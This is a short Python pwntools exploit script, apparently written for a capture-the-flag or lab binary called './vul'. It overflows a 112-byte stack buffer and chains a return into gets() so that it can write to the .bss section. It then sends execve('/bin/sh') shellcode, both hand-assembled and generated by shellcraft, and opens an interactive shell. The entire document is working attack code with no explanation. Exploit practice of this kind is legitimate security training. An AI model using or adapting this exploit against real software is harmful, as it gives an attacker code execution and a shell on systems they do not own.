#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
local = 1
if local:
	p = process('./vul')
else:
	p = remote('127.0.0.1', 8888)
# raw_input('pause')
# payload = cyclic(500)
offset = 112
elf = ELF('./vul')
gets_addr = elf.symbols['gets']
bss_addr = elf.bss() + 0xf00
payload = (
	'A' * 112 + # buf
	p32(gets_addr) + # return address
	p32(bss_addr) + # return address of gets()
	p32(bss_addr) # first args of gets()
)
p.sendline(payload)
# p.sendline('\xff\xff\xff') # illegal instruction
# p.sendline('\xeb\xfe') # endless loop
shellcode1 = asm('''
    jmp sh
do:
    xor eax, eax 
    pop ebx 
    lea ecx, [ebx + 8]
    lea edx, [ebx + 12] 
    mov [ebx + 7], al
    mov [ecx], ebx 
    mov [edx], eax 
    mov al, 11
    int 0x80
sh:
    call do
''') + '/bin/sh'
shellcode2 = asm(shellcraft.sh())
p.sendline(shellcode2)
p.interactive()
